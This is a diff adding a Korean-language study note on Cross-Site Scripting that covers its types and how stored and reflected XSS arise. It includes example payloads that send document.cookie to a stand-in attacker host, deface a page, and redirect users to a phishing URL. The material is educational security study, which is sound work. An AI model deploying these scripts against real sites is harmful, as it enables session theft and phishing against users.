@@ -1,0 +1,54 @@
+Cross-Site Scripting 의 약어는 CSS라고 불리는것이 옳지만 스타일시트를 정의하는 언어인 CSS 와의 중복으로 XSS로 명명됨.
+
+XSS는 클아이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행할 수 있다.
+
+CSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.
+이러한 기능의 예시는 로그인 시 출력되는 "안녕하세요" 와 같은 문구 도는 게시물과 댓글이 있다.
+
+Stored XSS: XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
+Reflected XSS: XSS에 사용되는 악성 스크립트가 ULR에 삽입 되고 서버의 응답에 담겨오는 XSS
+DOM-based XSS: XSS에 사용되는 악성 스크립트가 ULR Fragment에 삽입되는 XSS
+Universal XSS: 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS 
+
+자바스크립트는 다양한 동작을 정의할 수 있기에 XSS 공격에 주로 사용된다.
+자바 스크립트를 실행하기 위한 태그로는 <script> 가 있다.
+
+EX) 쿠키 및 세션 탈취 공격 코드
+<script>
+// "hello" 문자열 alert 실행.
+alert("hello");
+// 현재 페이지의 쿠키(return type: string)
+document.cookie; 
+// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
+alert(document.cookie);
+// 쿠키 생성(key: name, value: test)
+document.cookie = "name=test;";
+// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
+// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
+new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
+</script>
+
+EX) 페이지 변조 공격 코드
+<script>
+// 이용자의 페이지 정보에 접근.
+document;
+// 이용자의 페이지에 데이터를 삽입.
+document.write("Hacked By DreamHack !");
+</script>
+
+EX) 위치 이동 공격 코드
+<script>
+// 이용자의 위치를 변경.
+// 피싱 공격 등으로 사용됨.
+location.href = "http://hacker.dreamhack.io/phishing"; 
+// 새 창 열기
+window.open("http://hacker.dreamhack.io/")
+</script>
+
+Stored XSS는 서버의 데이터 베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할때 발생하는 XSS이다.
+대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드 하는 방식이 있다.
+
+Reflected XSS는 서버가 악성 스크립트가 담긴 요청을 출력할때 발생한다.
+대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색항에서 스크립트를 포함해 검색하는 방식이 있다.
+이용자가 게시물을 검색하면 서버는 검색 결과를 이용자에게 반환한다.
+일부 서비스에서는 검색 결과를 응답에 포함하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있다.
